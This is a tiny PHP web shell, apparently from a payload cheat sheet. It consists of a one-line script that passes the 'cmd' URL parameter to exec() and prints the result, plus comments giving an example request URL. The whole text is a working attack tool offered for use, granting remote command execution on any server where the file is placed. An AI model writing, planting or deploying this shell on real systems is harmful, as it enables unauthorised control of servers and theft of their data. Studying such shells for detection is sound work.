# This will only work if the exec() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_exec.php?cmd=id

<?php exec($_GET['cmd'], $o); print_r($o); ?>